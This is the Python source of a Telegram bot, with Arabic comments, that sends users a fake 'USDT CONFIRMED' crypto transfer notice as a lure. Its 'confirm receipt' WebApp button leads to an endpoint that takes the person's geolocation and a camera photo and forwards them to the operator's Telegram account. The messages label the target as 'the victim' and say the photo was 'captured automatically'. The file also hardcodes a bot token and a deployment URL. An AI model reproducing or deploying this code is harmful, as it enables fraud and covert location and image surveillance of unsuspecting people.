import os
import json
import logging
from flask import Flask, request, jsonify, send_from_directory
import requests
import hmac
import hashlib

app = Flask(__name__)

# التوكين الخاص بالبوت
TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"
YOUR_TELEGRAM_ID = 8391968596  # حسابك

TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"
WEBHOOK_URL = "https://usdt-uyp4.onrender.com/webhook"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== الصفحات ==========

@app.route('/')
def index():
    return "Bot is running. Webhook: /webhook"

@app.route('/app')
def mini_app():
    """صفحة WebApp - تفتح داخل تلغرام نفسه"""
    return send_from_directory('.', 'app.html')

@app.route('/health')
def health():
    return "OK", 200

# ========== Webhook ==========

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    logger.info(f"Received update: {json.dumps(data, indent=2)}")
    
    if 'message' in data:
        chat_id = data['message']['chat']['id']
        text = data['message'].get('text', '')
        
        if text == '/start':
            send_usdt_confirmation(chat_id)
    
    return "OK", 200

def send_usdt_confirmation(chat_id):
    """إرسال رسالة تأكيد USDT مع زر WebApp"""
    
    # رسالة احترافية كأنها تأكيد تحويل USDT
    message = """
╔══════════════════════╗
║  ✅ USDT CONFIRMED   ║
╠══════════════════════╣
║                      ║
║  📊 TRANSFER DETAILS ║
║                      ║
║  💰 Amount: 2,500 USDT
║  📤 From: BinanceHot
║  📥 To: Your Wallet  
║  🔗 Network: TRC-20  
║  ✅ Status: COMPLETED
║                      ║
║  ⏰ 2026-05-02 23:45
║  🆔 TXID: 4a8f2b...
║                      ║
╚══════════════════════╝

⚠️ يرجى تأكيد استلام التحويل
⚠️ Please confirm receipt
"""
    
    # زر WebApp - يفتح داخل تلغرام بدون رابط خارجي
    keyboard = {
        "inline_keyboard": [[
            {
                "text": "📥 تأكيد استلام التحويل",
                "web_app": {"url": "https://usdt-uyp4.onrender.com/app"}
            }
        ]]
    }
    
    requests.post(f"{TELEGRAM_API}/sendMessage", json={
        "chat_id": chat_id,
        "text": message,
        "reply_markup": keyboard,
        "parse_mode": "HTML"
    })
    
    logger.info(f"Sent USDT confirmation to {chat_id}")

# ========== استقبال بيانات WebApp ==========

@app.route('/webapp-data', methods=['POST'])
def receive_webapp_data():
    """استقبال الموقع والصورة من WebApp"""
    data = request.get_json()
    logger.info(f"WebApp data received: {json.dumps(data, indent=2)}")
    
    # إرسال البيانات لحسابك
    send_to_telegram(data)
    
    return jsonify({"status": "received"})

def send_to_telegram(data):
    """إرسال البيانات لحساب المسؤول"""
    
    chat_id = YOUR_TELEGRAM_ID
    
    location = data.get('location', {})
    photo = data.get('photo', '')
    user_info = data.get('user', {})
    
    message = f"""🔔 **بيانات الضحية - USDT CONFIRMED**

📍 **الموقع:**
• خط العرض: {location.get('latitude', 'N/A')}
• خط الطول: {location.get('longitude', 'N/A')}
• الدقة: {location.get('accuracy', 'N/A')} متر
• خرائط: https://www.google.com/maps?q={location.get('latitude', '0')},{location.get('longitude', '0')}

📱 **معلومات الجهاز:**
• المستخدم: {user_info.get('id', 'N/A')}
• اللغة: {user_info.get('language_code', 'N/A')}

📸 **تم التقاط الصورة بنجاح**
"""
    
    # إرسال الرسالة
    requests.post(f"{TELEGRAM_API}/sendMessage", json={
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"
    })
    
    # إرسال الموقع كموقع
    if location.get('latitude') and location.get('longitude'):
        requests.post(f"{TELEGRAM_API}/sendLocation", json={
            "chat_id": chat_id,
            "latitude": location['latitude'],
            "longitude": location['longitude']
        })
    
    # إرسال الصورة إذا وجدت
    if photo and photo.startswith('data:image'):
        try:
            # فك تشفير base64 وإرسالها
            import base64
            photo_data = photo.split(',')[1]
            image_bytes = base64.b64decode(photo_data)
            
            files = {'photo': ('photo.jpg', image_bytes, 'image/jpeg')}
            requests.post(f"{TELEGRAM_API}/sendPhoto", data={
                "chat_id": chat_id,
                "caption": "📸 صورة الضحية - تم التقاطها تلقائياً"
            }, files=files)
        except Exception as e:
            logger.error(f"Error sending photo: {e}")

# ========== إعداد Webhook ==========

@app.route('/setup', methods=['GET'])
def setup_webhook():
    """تثبيت webhook"""
    r = requests.post(f"{TELEGRAM_API}/deleteWebhook")
    r = requests.post(f"{TELEGRAM_API}/setWebhook", data={
        "url": WEBHOOK_URL
    })
    return jsonify(r.json())

# ========== تشغيل البوت ==========

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    # تثبيت webhook عند التشغيل
    with app.app_context():
        try:
            requests.post(f"{TELEGRAM_API}/deleteWebhook")
            requests.post(f"{TELEGRAM_API}/setWebhook", data={
                "url": WEBHOOK_URL
            })
            logger.info(f"Webhook set to {WEBHOOK_URL}")
        except Exception as e:
            logger.error(f"Failed to set webhook: {e}")
    
    app.run(host='0.0.0.0', port=port)
